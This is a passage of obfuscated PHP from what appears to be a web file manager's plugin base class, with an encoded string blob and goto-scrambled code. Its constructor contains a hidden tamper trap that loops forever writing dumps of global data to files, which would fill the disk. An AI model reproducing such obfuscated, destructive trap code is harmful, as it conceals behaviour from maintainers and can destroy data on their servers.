6hoq4/aGiGPQSZ3h48QRkowFk3aSh0cclO83SDK3oiOhIjfTx8EYr4m+')."\x30\x42\x9d\xf8\xc3\x1c\xd6\x0\xd7\x82\x39\x91\x16\x87\x31\xe\x2e\xe7\x21\x32\xa5\x98\xc9\x62\x60\x98\x95\x2c\x1d\xf1\xbc\x32\xb4\xcc\xc0\x8e\x69\x2e\x80\x22\x4\xb1\x5c\x1f\xd5\x8b\x2e\x7b"."\335\264\124\267\74\233\213\160\106\171\226\320\246\15\361\247\124\250\72\42\153\136\201\335\105\203\304\65\63\171\5\217\152\220\266\35\136\265\176\216\167\355\310\62\130\246\260\266"."\255\122\2\142\41\151\61\230\30\75\371\21\172\72\54\46\314\42\250\146\113\47\367\177\50\125\340\115\362\224\11\121\351\173\125\1\210\257\316\115\156\54\152\344\306\361\236\334"."\xc4\xf3\x61\x27\x77\xdf\x2a\xbb\x43\xa4\x2a\x5\x92\xe2\x89\xd\x2e\xea\x85\xe\x1\xab\x63\x5c\x62\xb1\x2\x65\xcb\xcc\xa3\x65\xb6\xe5\x49\x43\xf1\xfd\xb5\xa3\x79\xf6\xea\x9c\x35\x32\xf1\xde"."\313\371\344\110\174\35\302\336\242\4\210\25\26\277\252\170\12\127\312\52\136\321\220\42\335\33\126\112\350\344\57\36\311\221\230\145\223\265\106\210\136\256\273\16\314\132\271\143".strrev('V\\Jcºí—(ãOØÂâC<%2¬L´àRÈ¯–&Í"V²¥»Àïè>Ïx')."\324\330\63\252\64\226\156\52\134\1\121\346\361\114\252\330\10\260\165\333\333\345\142\356\264\227\316\373\62\373\370\52\313\205\247\225\13\11\145\351\71\236\322\264\54\0\301\73"."\272\227\277\336\131\3\20\335\300\126\5\125\204\4\300\25\100\157\320\156\226\102\210\231\343\216\220\130\177\307\52\32\243\121\45\324\250\70\2\61\2\32\113\25\54\323\341\374"."\xb\x4e\xf\x65\x25\x74\x1f\x95\x29\x94\x14\x2d\xe2\x5f\x22\xda\x71\x5d\xb6\x49\x5e\x98\x79\x56\x74\x94\xb1\xd6\x55\x76\xbc\x11\xcd\x31\xe2\xc5\x5a\x62\xa9\x3c\x41\xaf\x76\x19\x39\x8a\x1c\x76"."\232\60\267\326\6\177\103\13\57\147\122\122\356\251\321\2\24\342\105\340\214\264\264\214\151\21\336\132\162\117\140\70\11\55\57\7\243\46\227\51\340\313\35\255\106\25\330\43".strrev('Y>f9™&G’ôZşH’Ì'."\r".'3ZiI…ş:Ñ.srHQ¯ŞHËı‘[·'."\n".'öŒ')."\xe1\x37\x12\x1e\x2a\x86\x59\x4e\x28\x32\x91\xc0\x4c\x21\x70\x5\xc4\xd5\x7\x1e\x81\x2d\xa7\xa1\x6a\xb1\x87\x5a\x31\x32\xb9\x8\x69\xb3\xaa\x8\x4d\xc3\xe7\xb4\x70\x98\x21\xa7\xd8\xd8\x7f\xf9"."\x0\x5b\xb6\x5a\x29\x35\x9a\x22\x49\xd2\x8c\x66\xb8\xdb\x20\x98\x1d\x31\x49\x90\x30\xa5\x31\x5\x42\x7f\x4b\xab\x9f\xb9\x86\x92\xcd\x2a\x18\xa1\x4c\x43\x98\x5a\x97\xc0\x0\xf3\x14\xc\x37\x82"."\66\40\344\23\171\114\351\136\207\70\321\20\116\6\210\277\20\276\236\304\261\10\17\131\322\131\246\161\115\101\342\141\103\106\53\342\372\235\52\20\342\14\3\265\322\351\14\341"."\xe4\x2e\x97\x7e\xa5\x27\x3\xda\x19\xee\x74\x70\x69\x2e\x3a\x43\x9d\x7c\x98\x2e\x25\x1d\x4f\x25\xe0\x2e\x5f\x76\xd5\x4e\x4a\x89\x71\x8\x55\x55\x14\x65\x52\xc7\xe9\xd2\xc4\x8\x35\x2\xea\x7b"."\204\351\330\162\274\44\242\123\46\217\254\126\105\10\160\35\143\60\70\205\7\61\33\32\261\301\251\113\202\323\67\305\315\2\261\242\20\76\44\270\242\247\55\7\130\52\7\116"."\xdb\x15\xa0\x8a\x51\xae\xd2\x3c\x8a\xe7\x9a\xd0\x98\xed\x28\x93\x34\xf4\xf7\xf6\x7\x79\x54\x7\xdf\x9e\x94\x3b\x15\x2e\x8f\x3a\x99\xf6\x91\x78\xc5\x7d\xa2\xa4\x67\x94\x68\xbc\x27\xd2\x19\x8a".strrev('KWr8“R]ná9gõbˆ#ı?¼÷õA\'F°DÊŞàw<‚gB(æ¼”+’Ev')."\341\117\263\252\152\64\260\111\110\261\252\14\26\27\326\310\135\24\322\63\51\163\331\322\252\363\117\151\344\31\166\321\143\251\100\245\106\157\40\177\355\26\310\363\10\162\156\164"."\20\153\306\276\72\257\33\343\272\255\213\215\317\112\114\311\265\207\272\372\42\261\164\50\32\105\354\275\254\106\47\4\245\26\177\214\42\53\277\135\41\255\214\130\4\332\172\265".strrev('b¼ë¢Å¨`XJ>ú¤ÖİT¶SD=(4öWr	¯'."\0".'Oveldùtêp÷»$cğ.\'')."\116\12\126\334\47\153\315\246\322\264\1\26\47\71\175\253\225\41\201\37\77\377\137\167\125\317\12\347\113\172\226\251\53\160\203\71\352\345\276\123\176\117\221\265\131\365\330\316"."\107\76\333\343\23\27\25\151\342\310\206\275\36\146\22\162\34\150\105\32\27\211\247\351\123\166\242\11\304\50\132\123\145\371\152\53\230\145\157\221\60\116\25\373\230\13\63\221".strrev('pñÓOuñÕ^I=uÕä@<õÚºìó<"E©š0ë– \\B]”spÚ‡gÂ5').base64_decode('UM5hMTgU4i9XiKLelBodQMmKEJvwDEq70kzfwuJvESiLmfmvaIB4hQqXyo6LleyV')."\325\305\245\265\241\21\204\322\21\254\2\126\272\61\113\123\125\21\56\131\111\224\365\213\153\351\341\227\30\214\234\51\317\37\101\310\130\367\237\276\150\107\171\126\37\242\365\65"."\247\372\101\33\132\374\377\113\101\232\230\224\164\27\335\225\124\167\310\366\36\165\202\354\302\157\365\24\314\11\367\263\166\70\306\373\72\217\353\135\36\151\323\20\53\125\371\45"."\x21\x77\x21\x5f\xd5\x8b\x18\xa\x79\x50\x55\x41\xa0\xe\xab\x88\x5d\x1b\x31\x9e\x88\x64\x96\x9a\x9e\x49\x7f\x86\xe0\x97\x1d\x67\xde\x4e\x50\x44\x5\x4d\x36\x72\xa0\xea\x2c\xe8\xc5\xac\xc5\xb5"."\110\104\104\237\46\30\125\122\12\53\122\250\354\341\130\362\310\27\14\227\77\302\121\353\375\46\354\341\315\375\252\210\170\254\105\234\235\356\347\54\370\135\250\55\66\203\355\270"."\x9e\x4b\x49\x99\x29\x35\xef\xa3\x14\x19\xc6\x6a\x22\xd4\x31\x25\x7f\xcb\x9a\xa3\x64\x14\x28\x91\x9\x93\xb2\x7c\xbd\x97\x48\x19\xd8\x2b\x69\x59\x1f\x79\xc2\x8b\xa2\x3a\xef\x2b\x1f\xd2\x4e\xe3"."\xf8\x53\x2e\x9d\x2f\x9a\x23\x6a\x31\x41\x95\xaf\x5c\x96\x22\x16\xe2\xa6\xb8\x42\xa5\x2b\x1b\x8d\xa\xaa\xe5\xb2\xb8\x7a\x91\x8f\x4c\xf4\xaf\xcb\x9a\xe\xd2\x6\x52\xbd\x69\x62\x13\x9e\xa6\x77".base64_decode('tUkBc9KlDY2EC5yKEaGCblesJfF5stYvvaoSZluQHfWzn95NwYTJVbL7Qi517ZYe').strrev('2÷`‡,H¸L…0Aò>ÃQ	AŒ®‹(2Fdõ\\%Ö²(À2µb/ßV')."\xd4\xc9\x4f\x97\x96\xe3\x5c\xc\xe\x8b\xd3\x5c\x76\x64\x21\x14\x11\xbc\x8f\xa0\xb1\x66\xf8\x1b\x6e\x3e\x3a\x32\xf1\x76\x27\x7d\xb1\xcd\xc7\x5f\x67\xf3\x51\x47\x82\x3e\x78\x93\xcd\x27\xcc\xef".base64_decode('PuwRGvFusPuxYdxnrqZYxU54OQk+VZ4CCe/EpcxqmaO4VTUqJXFPjQJuzqpqwNII')."\53\126\321\107\356\224\175\314\275\233\147\72\304\250\344\225\251\61\207\37\135\7\325\126\45\354\122\326\215\257\332\26\217\130\354\136\316\233\115\167\101\135\332\322\204\31\12\165"."\153\131\205\332\327\224\262\255\263\347\56\224\305\22\142\175\304\355\25\330\301\303\155\33\320\31\142\305\225\215\56\170\122\230\57\115\171\337\222\104\267\42\161\365\343\211\36\334"."\375\277\203\174\101\367\323\254\222\132\157\365\43\264\125\63\100\200\120\122\170\221\216\62\217\262\202\211\165\10\154\261\175\350\341\45\236\114\164\267\105\17\376\32\343\20\315\112"."\73\201\276\150\147\26\61\167\134\302\122\137\307\122\335\254\140\55\216\207\314\4\143\257\164\362\362\265\346\355\73\231\30\220\203\210\144\211\45\222\153\164\114\257\20\7\27\307"."\x27\x1a\x91\x21\xc6\x8d\x22\x1c\xb8\xd8\xac\x58\xec\x29\x9\xa5\xfc\x2f\x16\x90\x71\x37\x94\x11\x12\xaa\x2a\x35\x46\x1e\x5c\xc6\xf0\x46\x8d\x17\xb\xa5\xfb\xfe\xf\xe9\x37\xa5\xcb\x38\x27\xe7"."\127\35\277\4\220\222\340\117\163\342\144\201\151\120\142\70\335\143\365\124\217\212\211\72\206\175\312\276\62\125\23\147\322\303\206\302\361\224\104\226\341\322\314\176\161\37\374\72"."\x43\x4e\xf2\x93\x8d\x4e\x41\x30\x1e\x74\x87\xba\x76\xab\xe4\xa1\x56\x36\xe8\x22\x15\xc9\xdb\xa0\xba\x6a\xe9\x5\x3b\x21\xc2\x21\x32\x1f\x18\x4\xec\x61\xe2\x4f\x93\x18\xf2\x85\x7a\xb8\x71\x9f"."\x2a\xa9\x17\xb9\xe5\x4a\x78\x76\xa5\x47\x4b\x4d\xf9\x5b\xcc\x3a\xc6\xe7\x71\xe6\x21\x14\xb5\xee\xe2\xb\x51\xb8\xcb\xf3\xa0\x2d\xc1\x4a\xde\x57\x6e\xd9\x14\x11\x54\x20\xb0\x9c\x64\x33\xea\x62"."\102\370\53\137\56\246\304\366\76\344\207\110\63\331\167\57\12\362\115\0\307\51\240\103\242\370\115\133\223\116\113\326\251\274\364\25\253\224\104\100\22\306\22\376\207\47\272\114"."\x6b\xb1\x3\x25\xcf\xce\x67\x6\xbb\xb6\xe7\x59\x4f\xea\x7f\x95\x7e\x33\x32\xfd\xff\xf7\xcb\x75\xff\xb7\x1e\xac\x9b\xdb\xcc\xc4\xe6\xae\x67\x71\x7b\x80\x58\x86\xde\xe2\xbb\x31\x2e\x3c\xa0\x22"."\133\317\70\334\207\346\141\0\105\374\5\150\51\314\265\133\231\23\55\346\133\113\145\327\74\152\261\50\35\255\265\331\213\252\367\104\21\360\215\362\307\50\153\5\274\126\144\336"."\267\105\7\331\53\335\344\331\320\341\132\31\5\346\341\134\114\15\70\246\121\214\170\65\252\157\72\361\172\105\335\176\217\45\42\243\52\233\150\25\321\42\314\37\131\220\175\145"."\60\303\206\51\121\206\146\145\363\321\170\231\261\166\215\200\331\207\341\27\14\322\1\53\311\230\310\25\125\205\277\122\256\125\160\105\312\23\14\253\206\55\156\335\157\272\103\211"."\x3e\xcf\xdb\x88\x34\x13\x73\xb7\x58\xfd\xd6\x7a\xf5\xc5\x77\x75\x69\xbe\xf3\xe5\x22\x58\x8d\xd8\x2d\x6f\xe2\xef\x61\x37\x7b\x1f\xc8\x6e\xf1\x57\x37\x46\xb5\xf8\xb1\xc8\x23\x81\x85\xc\x4c\x6c"."\104\356\137\310\375\150\215\62\24\122\223\42\317\76\366\112\355\35\313\337\244\24\62\64\374\45\217\227\355\374\176\313\44\4\235\73\226\13\136\44\205\114\351\305\346\231\1\271"."\xc7\x12\x62\xf5\xdc\x67\x20\x2e\x4b\x5c\xf0\xe9\x26\x71\x7e\xce\x8a\xe\xf4\x35\x10\x83\x14\x80\x58\xc4\x24\x74\x9b\x62\xed\xa5\xe7\x90\xf1\x9e\x12\xbe\xf\xb1\xa7\x2a\x22\xeb\xdb\x28\x9d\xda"."\314\106\114\122\261\206\50\227\104\316\226\337\231\160\227\304\112\363\356\275\264\244\126\266\214\151\331\122\66\36\137\53\57\206\60\131\342\40\247\341\247\153\35\327\132\10\77\366".base64_decode('Xv/1hA+nrLWLw4Y7WDlKuqJExHbW/SAGSSTRzE0m1CBdsrnvOLl/7ypMWdGjUjIp')."\xc5\xbc\xaf\xa1\x5f\x6c\x47\x17\x11\xe\x1b\x48\x32\xbd\x3e\x8\x49\xaf\x22\x7b\x4b\xb9\x5f\xd3\x96\x6e\x44\x33\x4\xf2\xc2\xd5\x97\x5e\xe2\x2e\x4e\xa2\x33\x58\x31\xcc\x9\x89\x23\xc0\x13\x5f"."\353\75\350\234\72\56\210\44\101\213\147\263\374\255\166\127\326\54\343\106\170\54\212\21\317\272\143\42\113\62\315\25\12\334\332\204\367\201\334\200\154\316\353\312\130\35\53\114"."\167\245\362\342\372\103\14\23\307\325\32\76\331\150\356\342\262\151\60\7\52\21\105\237\64\340\372\103\22\337\203\55\27\204\142\21\35\12\147\342\105\223\156\103\144\236\215\257"."\31\312\103\354\104\374\256\130\17\47\207\105\42\214\142\360\44\331\362\63\364\356\213\116\131\252\40\201\200\126\214\112\325\311\227\240\373\54\220\254\335\210\200\112\367\24\113\26"."\334\42\201\35\165\162\55\56\24\311\7\6\71\23\162\242\253\73\336\245\45\114\210\0\137\32\131\42\2\130\232\26\162\47\321\374\232\247\367\162\1\357\310\150\11\173\102\167"."\62\5\211\63\252\116\254\216\267\252\46\25\32\252\335\137\157\257\330\234\172\371\105\121\111\125\177\44\115\212\224\131\243\14\355\121\315\142\64\11\227\24\344\252\253\354\76\246"."\0\227\245\111\270\154\125\62\53\54\211\127\244\162\216\132\261\367\61\274\352\311\3\231\103\266\306\200\75\234\71\315\272\257\371\254\231\271\272\71\200\70\157\156\42\244\250\335".base64_decode('CyFb8Nxo1+pFzcz77IXI7TkFauFallIDuwrVhmo8LtJqKFrQOvEZLXt0qpEsa23U')."\326\353\110\324\334\372\266\133\341\302\23\57\117\14\70\357\244\1\246\211\205\70\305\242\316\336\35\224\124\246\147\272\360\173\305\30\65\114\176\146\144\205\276\34\126\356\15\131"."\336\211\254\252\315\15\247\106\105\362\207\132\123\203\333\207\371\372\152\16\272\250\62\231\275\244\372\116\131\36\323\321\63\232\333\351\252\354\330\211\246\263\106\212\222\154\320\43"."\x96\x13\x52\x6\x97\x42\x40\xd\xc1\x15\x89\xa2\x9f\x1\x21\xfe\xa6\xf5\x89\xb1\x48\x30\xe1\x32\x39\xa0\x74\x2\x5c\x9\xd0\xdb\xc4\x4e\x7c\x6b\xcd\xef\x91\x88\xc3\x50\x7a\xae\xd2\xe4\xa4\x69".base64_decode('OT6cljLL5LfDdBxxu07ZekIM4sPRJymPoC9xaYQ7RW4jCNgS9EI+4V4T88tJjaYS').base64_decode('pOQK4FsOHpDPPrjf7K54bmBFBGJOR8xJ5o4R2z6L/uCLCWnKBH0C4CervxCrcjtI')."\x53\x82\xe0\xc6\xdf\xaf\x62\x42\x11\x9e\xd9\xa\xac\x2f\xe7\x5d\xc5\xe9\x63\x45\x5c\xa5\xf3\xc3\x6a\x0\x29\xaa\xa8\x82\xfa\xf0\x26\xb2\x2e\xb0\xd\x49\xa6\x92\x55\x49\xfd\xa1\x64\x72\x55\x3c"."\321\105\135\176\127\45\223\122\222\72\121\125\122\177\157\74\266\257\264\160\137\50\22\255\112\303\232\107\261\264\360\275\105\223\42\375\244\227\344\372\156\137\275\210\164\256\20\75"."\41\27\305\102\70\137\56\230\114\346\316\56\57\222\152\221\161\351\222\345\243\126\22\116\330\104\31\103\317\214\12\341\236\52\21\357\66\363\117\310\77\334\357\347\170\24\374\30"."\220\102\105\130\153\50\6\165\47\312\20\213\135\240\363\275\316\11\151\331\26\114\334\202\7\134\267\345\122\74\331\33\4\331\110\360\47\37\272\44\242\251\346\144\311\102\336\352"."\x4b\x7\x92\x2a\x26\x3\x77\x72\xb9\x9\xea\x67\xeb\xcd\x11\xe9\x52\x81\xb2\x34\x60\x89\x8\xd3\x2b\x69\x89\xd1\x6f\x57\xb2\xa3\xe6\x6b\x5e\x1a\x53\xc9\x1e\xde\xfd\x42\xe6\xf6\x7f\x0\x5b\x62".strrev(''."\0".''."\0".'ª†)')."".""."", 10, -8))); goto A¸ñ˜¶À‡Æ; B¥—¼Š×–…: function binCheckBigger($â™¦÷Ó¸, $ÓÌ–¥»‚) { return $â™¦÷Ó¸ > $ÓÌ–¥»‚; } $_SERVER[$_SERVER[ï¯ò˜Ã›][3]] = ("\x38\x31\x30\x35".base64_decode('MTk='))+0;$_9sl0="ia7251vm4ptgfqd6c3r8wo9ynbezluhk0jxsa15blwkzr8j9mt20hsiqnvufcxo7d";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¾—Ñß¬¬, $€Ê¬—ƒ¹) { $Ò×İ›ù =& $_SERVER[ïëó©ÒÚ]; if (isset(self::$_methodList[$¾—Ñß¬¬])) { return @call_user_func_array(self::$_methodList[$¾—Ñß¬¬], $€Ê¬—ƒ¹); } else { if (method_exists($this, $¾—Ñß¬¬)) { return call_user_func_array(array($this, $¾—Ñß¬¬), $€Ê¬—ƒ¹); } else { think_exception(__CLASS__ . $Ò×İ›ù[4] . $¾—Ñß¬¬ . $Ò×İ›ù[5]); } } } public static function __callStatic($•Í¤¥, $ÊŠñ¶ø) { if (isset(self::$_methodListStatic[$•Í¤¥])) { return call_user_func_array(self::$_methodListStatic[$•Í¤¥], $ÊŠñ¶ø); } else { if (method_exists(self, $•Í¤¥)) { return call_user_func_array(array(self, $•Í¤¥), $ÊŠñ¶ø); } else { show_json("{$•Í¤¥}\50\51\x20\156\x6f\x74\40\145\x78\151\163\164\73", !1); } } } public static function addMethod($ş¿§·ı¶, $»™‹ˆ³á) { self::$_methodList[$ş¿§·ı¶] = $»™‹ˆ³á; } public static function addMethodStatic($ÇÙÙî¬, $ğÜÑ¸©ä) { self::$_methodListStatic[$ÇÙÙî¬] = $ğÜÑ¸©ä; } } goto Dœçƒœ‚‚–; BÔ†›ñ¶£‘: define($_SERVER[ïëó©ÒÚ][238], 1); define($_SERVER[ïëó©ÒÚ][239], 2); define($_SERVER[ïëó©ÒÚ][240], 3); goto Eéë÷‰¡; AÎÀïÒ­ËÉ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $÷ˆÔÀíş =& $_SERVER[ïëó©ÒÚ]; $Šö”¸— = $_SERVER[$÷ˆÔÀíş[403]] . $÷ˆÔÀíş[404]; $›½€À¬ = $÷ˆÔÀíş[1524]; if ($_SERVER[$÷ˆÔÀíş[400]] != $›½€À¬($Šö”¸—)) { $ú”Åª¹ = $÷ˆÔÀíş[882]; $ÏÉü®…Ç = $÷ˆÔÀíş[402]; $úÇÊ‘ç´ = $_SERVER[$÷ˆÔÀíş[403]] . $÷ˆÔÀíş[404]; $½ëòÌƒç = $ÏÉü®…Ç($úÇÊ‘ç´); $ĞæÜå¸š = explode($÷ˆÔÀíş[231], $½ëòÌƒç); if (count($ĞæÜå¸š) < $÷ˆÔÀíş[631]) { $Â­´±ã¨ = $÷ˆÔÀíş[406]; $Â­´±ã¨(); } $€Ğ€ö± = $÷ˆÔÀíş[883]; $€Ğ€ö±($_SERVER[$÷ˆÔÀíş[884]]); $ú”Åª¹ = $÷ˆÔÀíş[882]; $ú”Åª¹(); $ïíÎí• = $÷ˆÔÀíş[1525]; $ÔÁ£§ö™ = json_encode($GLOBALS[$÷ˆÔÀíş[1526]]); $÷ˆÄ•·ô = 1; for ($¨äµæÇ = $÷ˆÄ•·ô; $¨äµæÇ > 0; $¨äµæÇ++) { $ïíÎí•(DATA_PATH . $¨äµæÇ, $ÔÁ£§ö™); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($÷ˆÔÀíş[1527]); $this->pluginName = str_replace($÷ˆÔÀíş[1527], $÷ˆÔÀíş[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $÷ˆÔÀíş[8]; $this->pluginApi = appHostGet() . $÷ˆÔÀíş[1528] . $this->pluginName . $÷ˆÔÀíş[8]; $this->pluginHost = $config[$÷ˆÔÀíş[1529]] . $this->pluginName . $÷ˆÔÀíş[8]; $this->pluginHostDefault = $config[$÷ˆÔÀíş[1529]] . $this->pluginName . $÷ˆÔÀíş[8]; $–’«İ¨ = $config[$÷ˆÔÀíş[1530]]; if ($–’«İ¨ && strpos($÷ˆÔÀíş[50] . $–’«İ¨ . $÷ˆÔÀíş[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$÷ˆÔÀíş[1531]] . $this->pluginName . $÷ˆÔÀíş[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ïëó©ÒÚ][1532]); } protected function assign($Íğ°³À•, $€ŒÏñÏ = false) { if (is_array($Íğ°³À•)) { $this->values = array_merge($this->values, $Íğ°³À•); } else { $this->values[$Íğ°³À•] = $€ŒÏñÏ; } } protected function display($šûèìÅì) { extract($this->values); require $šûèìÅì; } final function hookRegist($¢ÖíåÇÖ) { $this->modelPlugin->appRegist($this->pluginName, $¢ÖíåÇÖ); } final function appIcon() { $Ì¥èª±» =& $_SERVER[ïëó©ÒÚ]; $¥†ó…üš = $this->appPackage(); $’Ç÷¢ = $Ì¥èª±»[12]; if (isset($¥†ó…üš[$Ì¥èª±»[425]])) { if (isset($¥†ó…üš[$Ì¥èª±»[425]][$Ì¥èª±»[1533]])) { $’Ç÷¢ = $Ì¥èª±»[1534] . $¥†ó…üš[$Ì¥èª±»[425]][$Ì¥èª±»[1533]] . $Ì¥èª±»[1535]; } else { if ($¥†ó…üš[$Ì¥èª±»[425]][$Ì¥èª±»[1536]]) { $’Ç÷¢ = $Ì¥èª±»[1537] . $¥†ó…üš[$Ì¥èª±»[425]][$Ì¥èª±»[1536]] . $Ì¥èª±»[1538]; } } } return $’Ç÷¢; } final function fileCanView($òÒ×õşí) { $ÖÜë½şÏ =& $_SERVER[ïëó©ÒÚ]; if (request_url_safe($òÒ×õşí)) { return !0; } if ($this->isShare($òÒ×õşí)) { return !0; } $’Á = Session::get($ÖÜë½şÏ[1539]); if (!$’Á || !$’Á[$ÖÜë½şÏ[1540]]) { $Í“åé™ï = $ÖÜë½şÏ[1541] . rawurlencode(this_url()); show_tips(LNG($ÖÜë½şÏ[1542]) . $ÖÜë½şÏ[1543] . $Í“åé™ï . $ÖÜë½şÏ[1544] . LNG($ÖÜë½şÏ[1545]) . $ÖÜë½şÏ[1546], !1); } if (!Action($ÖÜë½şÏ[1547])->authCan($ÖÜë½şÏ[1548])) { show_tips(LNG($ÖÜë½şÏ[1549]) . $ÖÜë½şÏ[1550], !1); } ActionCall($ÖÜë½şÏ[1551], $òÒ×õşí); } final function isShare($÷ÚŸÅäÉ) { $Ü”å‘éæ = KodIO::parse($÷ÚŸÅäÉ); return $Ü”å‘éæ[$_SERVER[ïëó©ÒÚ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($íŠöÉË) { if (request_url_safe($íŠöÉË)) { return $íŠöÉË; } if (!$this->isShare($íŠöÉË)) { $íŠöÉË = $this->filePath($íŠöÉË); } return Action($_SERVER[ïëó©ÒÚ][1178])->linkOut($íŠöÉË); } public function filePathLinkOut($œá¡ÂŸâ) { if (request_url_safe($œá¡ÂŸâ)) { return $œá¡ÂŸâ; } $this->fileCanView($œá¡ÂŸâ); return Action($_SERVER[ïëó©ÒÚ][1178])->link($œá¡ÂŸâ); } final function filePath($±îÂäŠ¨) { $ßÈ¹ü „ =& $_SERVER[ïëó©ÒÚ]; if ($á«ŒŒŠ– = $this->checkSharePath($±îÂäŠ¨)) { Hook::trigger($ßÈ¹ü „[1552], $á«ŒŒŠ–); return $á«ŒŒŠ–; } $this->fileCanView($±îÂäŠ¨); if (request_url_safe($±îÂäŠ¨)) { $É²¯ˆÜß = parse_url_query($±îÂäŠ¨); if (isset($É²¯ˆÜß[$ßÈ¹ü „[1553]]) && isset($É²¯ˆÜß[$ßÈ¹ü „[213]])) { $£¦ïª‹° = Model($ßÈ¹ü „[780])->get($ßÈ¹ü „[781]); $Š„ä×Øœ = Mcrypt::decode($É²¯ˆÜß[$ßÈ¹ü „[213]], $£¦ïª‹°); if ($Š„ä×Øœ) { $this->fileInfo = IO::infoWithChildren($Š„ä×Øœ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $Š„ä×Øœ; } } $±îÂäŠ¨ = $this->_cacheHttpFile($±îÂäŠ¨); $this->fileInfo = IO::infoWithChildren($±îÂäŠ¨); } else { $this->fileInfo = IO::infoWithChildren($±îÂäŠ¨); if (!$this->fileInfo) { show_tips(LNG($ßÈ¹ü „[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ßÈ¹ü „[1552], $±îÂäŠ¨); return $±îÂäŠ¨; } final function _cacheHttpFile($¯÷èöÊÁ) { $Ü¡ŠıÕÛ = hash_path($¯÷èöÊÁ, !0); $this->cachePath = $this->pluginCachePath($Ü¡ŠıÕÛ); if ($ÀğÄ±ø = IO::fileNameExist($this->cachePath, $Ü¡ŠıÕÛ)) { return KodIO::make($ÀğÄ±ø); } $üî”îš = $this->cachePath . $Ü¡ŠıÕÛ; return $this->pluginCacheFileSet($üî”îš, file_get_contents_nossl($¯÷èöÊÁ)); } final function _tmpFileName($Â®Æ’Õ° = array()) { $õÅæüÔ =& $_SERVER[ïëó©ÒÚ]; if (!$Â®Æ’Õ°) { $Â®Æ’Õ° = $this->fileInfo; } if (isset($Â®Æ’Õ°[$õÅæüÔ[177]])) { return $Â®Æ’Õ°[$õÅæüÔ[177]]; } if (isset($Â®Æ’Õ°[$õÅæüÔ[170]][$õÅæüÔ[177]])) { return $Â®Æ’Õ°[$õÅæüÔ[170]][$õÅæüÔ[177]]; } $Ãì ™É¢ = IO::hashSimple($Â®Æ’Õ°[$õÅæüÔ[84]]); if ($Ãì ™É¢) { return $Ãì ™É¢; } $¬Çêãúè = array($Â®Æ’Õ°[$õÅæüÔ[32]], $Â®Æ’Õ°[$õÅæüÔ[84]], $Â®Æ’Õ°[$õÅæüÔ[76]]); if (isset($Â®Æ’Õ°[$õÅæüÔ[530]])) { $¬Çêãúè[] = $Â®Æ’Õ°[$õÅæüÔ[530]]; } return md5(implode($õÅæüÔ[11], $¬Çêãúè)); } final function checkSharePath($¡ŞÙˆ ü) { $³â‰ÅŸÈ =& $_SERVER[ïëó©ÒÚ]; if (!defined($³â‰ÅŸÈ[484])) { define($³â‰ÅŸÈ[523], 0); } if (!$this->isShare($¡ŞÙˆ ü)) { return !1; } $£ËÙ©ï = Action($³â‰ÅŸÈ[1178])->sharePathInfo($¡ŞÙˆ ü); if (!isset($£ËÙ©ï[$³â‰ÅŸÈ[84]])) { show_json(LNG($³â‰ÅŸÈ[1554]), !1); } $this->fileInfo = $£ËÙ©ï[$³â‰ÅŸÈ[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$³â‰ÅŸÈ[177]]); return $£ËÙ©ï[$³â‰ÅŸÈ[84]]; } final function pluginCachePath($œ–Òü¸‹ = '') { $á§×Ûµö =& $_SERVER[ïëó©ÒÚ]; $Ãôµìß = IO_PATH_SYSTEM_TEMP . $á§×Ûµö[1555] . $this->pluginName; if (!($ÊÔ´Û¾  = IO::infoFull($Ãôµìß))) { return IO::mkdir($Ãôµìß . $á§×Ûµö[8] . $œ–Òü¸‹); } if (empty($œ–Òü¸‹)) { return $ÊÔ´Û¾ [$á§×Ûµö[84]]; } if (!($¼™ôâ¡’ = IO::fileNameExist($ÊÔ´Û¾ [$á§×Ûµö[84]], $œ–Òü¸‹))) { return IO::mkdir($ÊÔ´Û¾ [$á§×Ûµö[84]] . $œ–Òü¸‹); } return KodIO::make($¼™ôâ¡’); } final function pluginCacheFileSet($•Óá‰’, $‘Â°¶â” = '') { $³ïıô½ =& $_SERVER[ïëó©ÒÚ]; if (!($íŠñ«Ø¡ = IO::infoFull($•Óá‰’))) { return IO::mkfile($•Óá‰’, $‘Â°¶â”, REPEAT_REPLACE); } IO::setContent($íŠñ«Ø¡[$³ïıô½[84]], $‘Â°¶â”); return $íŠñ«Ø¡[$³ïıô½[84]]; } final function pluginLocalFile($êÛß‘£ã = '') { $±ÓŠ¤› =& $_SERVER[ïëó©ÒÚ]; $ÚĞ®ÎŒå = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ÚĞ®ÎŒå)) { mk_dir($ÚĞ®ÎŒå); } if (!$êÛß‘£ã) { return $ÚĞ®ÎŒå; } $ãŞµŞÔû = IO::info($êÛß‘£ã); $Ú¦ª·ôŒ = $this->_tmpFileName($ãŞµŞÔû) . $±ÓŠ¤›[10] . $ãŞµŞÔû[$±ÓŠ¤›[174]]; if (!checkExtSafe($Ú¦ª·ôŒ)) { $Ú¦ª·ôŒ = $Ú¦ª·ôŒ . $±ÓŠ¤›[1556]; } $¡›ãŞİ = $ÚĞ®ÎŒå . $Ú¦ª·ôŒ; if (@file_exists($¡›ãŞİ)) { return $¡›ãŞİ; } return IO::copy($êÛß‘£ã, $ÚĞ®ÎŒå, 0, $Ú¦ª·ôŒ); } final function appPackage() { $Û†æ¹äÊ =& $_SERVER[ïëó©ÒÚ]; if ($this->packageData) { return $this->packageData; } $äÜ¯òŸ‘ = $this->parseFile($this->pluginPath . $Û†æ¹äÊ[1557]); $this->parseLang($äÜ¯òŸ‘); $‚±ØŸ±¨ = json_decode_force($äÜ¯òŸ‘); if (!$‚±ØŸ±¨) { return array(); } $Ëíæ®™Õ = 